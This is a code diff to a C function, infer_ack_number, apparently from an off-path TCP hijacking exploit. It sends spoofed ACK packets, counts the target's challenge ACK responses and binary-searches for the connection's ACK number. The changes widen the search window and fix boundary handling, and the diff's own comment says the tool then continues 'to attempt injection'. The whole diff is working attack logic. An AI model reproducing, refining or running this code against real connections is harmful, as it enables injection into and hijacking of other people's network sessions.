@@ -1532,8 +1532,15 @@ int infer_ack_number(void)
 	gettimeofday(&infer_start, NULL);
 
 	if (g_ctx.start_ack) {
-		bs_start = g_ctx.start_ack - (g_ctx.winsz / 2);
-		bs_end = g_ctx.start_ack + (g_ctx.winsz / 2);
+		uint32_t start_ack, end_ack;
+
+		/* convert start_ack into something that should be beyond the left side
+		 * of the challenge ACK window. */
+		start_ack = end_ack = g_ctx.start_ack - (g_acks[2] - 1);
+		start_ack -= (g_ctx.winsz * 5);
+		bs_start = start_ack;
+		end_ack += (g_ctx.winsz * 3);
+		bs_end = end_ack;
 		step = 1;
 	}
 
@@ -1565,7 +1572,6 @@ int infer_ack_number(void)
 			if (!tcp_send(g_ctx.pch, spoof, TH_ACK, "z", 1))
 				return 0;
 			usleep(g_ctx.packet_delay);
-			spoof->ack = bs_mid-1;
 			if (!tcp_send(g_ctx.pch, spoof, TH_ACK, "z", 1))
 				return 0;
 			usleep(g_ctx.packet_delay);
@@ -1641,10 +1647,9 @@ int infer_ack_number(void)
 					printf("[!] Exhausted ack window binary search...\n");
 					/* go back to the beginning of the schedule?? */
 					return 0;
-				} else {
+				} else
 					/* adjust range */
 					bs_end = bs_mid;
-				}
 			} else if (g_chack_cnt == 100) {
 				/* if our window is 1, we win! */
 				if (bs_mid == bs_end - 1)
@@ -1654,8 +1659,10 @@ int infer_ack_number(void)
 					bs_start = bs_mid;
 			} else if (g_chack_cnt == 99) {
 				/* this could mean we found the boundary, or maybe packet loss */
-				if (last_chack_cnt == 99)
+				if (last_chack_cnt == 99) {
+					bs_mid--;
 					found = 1;
+				}
 				else
 					fprintf(stderr, "[!] suspicious challenge ACK count! retrying...\n");
 			} else {
@@ -1663,13 +1670,14 @@ int infer_ack_number(void)
 			}
 
 			if (found) {
-				u_long ack = (bs_mid - (g_acks[2] - 1)) & 0xffffffff;
+				uint32_t ack = bs_mid;
 
-				/* continue with step2 -- try to reset the connection */
+				/* we found it! continue on to attempt injection */
+				ack -= (g_acks[2] - 1);
 				gettimeofday(&now, NULL);
 				timersub(&now, &infer_start, &diff);
-				printf("[*] Determined approx. ACK value (1): %lu, start_ack: %lu (after %lu %lu)\n", ack, bs_mid,
-						diff.tv_sec, diff.tv_usec);
+				printf("[*] Determined approx. ACK value (1): %lu, from %lu (after %lu %lu)\n",
+						(u_long)ack, bs_mid, diff.tv_sec, diff.tv_usec);
 				spoof->ack = ack;
 				g_chack_cnt = 0;
 				return 1;
